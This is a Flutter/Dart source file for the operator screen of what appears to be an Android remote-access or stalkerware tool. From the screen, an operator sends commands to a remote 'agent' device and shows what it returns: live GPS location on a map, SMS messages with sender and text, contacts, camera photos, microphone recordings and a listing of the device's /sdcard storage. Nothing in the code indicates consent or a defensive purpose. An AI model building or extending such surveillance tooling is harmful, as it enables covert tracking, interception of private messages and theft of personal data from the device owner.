import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:google_maps_flutter/google_maps_flutter.dart';
import '../ws_client.dart';

class DevicePage extends StatefulWidget {
  final String agentId;
  const DevicePage({super.key, required this.agentId});
  @override
  State<DevicePage> createState() => _DevicePageState();
}

class _DevicePageState extends State<DevicePage> {
  final _out = <String>[];
  LatLng? _here;
  bool _busy = false;
  late WsClient _ws;

  @override
  void initState() {
    super.initState();
    _ws = context.read<WsClient>();
    _ws.stream.listen(_onResult);
  }

  void _onResult(Map<String, dynamic> ev) {
    if (ev['type'] != 'result' || ev['id'] != widget.agentId) return;
    final cmd = ev['cmd'];
    setState(() {
      _busy = false;
      switch (cmd) {
        case 'location':
          if (ev['lat'] != null) {
            _here = LatLng(ev['lat'], ev['lon']);
            _out.insert(0, '📍 ${ev['lat']}, ${ev['lon']}  (±${ev['acc']}m)');
          }
          break;
        case 'sms':
          for (var s in (ev['data'] ?? [])) {
            _out.insert(0, '📩 ${s['from']}: ${s['body']}');
          }
          break;
        case 'contacts':
          final n = (ev['data'] as List?)?.length ?? 0;
          _out.insert(0, '👤 $n contacts retrieved');
          break;
        case 'photo':
          _out.insert(0, '📷 photo received (${(ev['data'] as String).length} b64)');
          break;
        case 'mic':
          _out.insert(0, '🎙️ audio: ${ev['file']}');
          break;
        default:
          _out.insert(0, '${ev['cmd']} → ${jsonEncode(ev).substring(0, 120)}');
      }
    });
  }

  void _cmd(String c, [Map<String, dynamic>? a]) {
    setState(() => _busy = true);
    _ws.sendCmd(widget.agentId, c, a);
    _out.insert(0, '▶ $c');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.agentId.substring(0, 8),
            style: const TextStyle(fontWeight: FontWeight.w600)),
        backgroundColor: Colors.transparent,
      ),
      body: Column(children: [
        SizedBox(
          height: 220,
          child: _here == null
            ? const Center(child: Text('location — tap below',
                style: TextStyle(color: Colors.white38)))
            : GoogleMap(
                initialCameraPosition:
                    CameraPosition(target: _here!, zoom: 16),
                markers: {Marker(markerId: const MarkerId('a'),
                                 position: _here!)}),
        ),
        _ActionRow(busy: _busy, on: _cmd),
        const Divider(height: 1),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.all(12),
            itemCount: _out.length,
            itemBuilder: (_, i) => Padding(
              padding: const EdgeInsets.symmetric(vertical: 4),
              child: Text(_out[i],
                style: const TextStyle(fontSize: 13,
                    fontFamily: 'monospace', color: Colors.white70)),
            ),
          ),
        ),
      ]),
    );
  }
}

class _ActionRow extends StatelessWidget {
  final bool busy;
  final void Function(String, [Map<String, dynamic>?]) on;
  const _ActionRow({required this.busy, required this.on});

  @override
  Widget build(BuildContext context) {
    final actions = <(IconData, String, Map<String, dynamic>?)>[
      (Icons.my_location, 'location', null),
      (Icons.message, 'sms', null),
      (Icons.people, 'contacts', null),
      (Icons.camera_alt, 'photo', null),
      (Icons.mic, 'mic', {'secs': 10}),
      (Icons.folder, 'files', {'dir': '/sdcard'}),
    ];
    return Padding(
      padding: const EdgeInsets.all(12),
      child: Wrap(spacing: 8, runSpacing: 8, children: [
        for (final a in actions)
          FilledButton.tonalIcon(
            onPressed: busy ? null : () => on(a.$2, a.$3),
            icon: Icon(a.$1, size: 18),
            label: Text(a.$2),
          ),
      ]),
    );
  }
}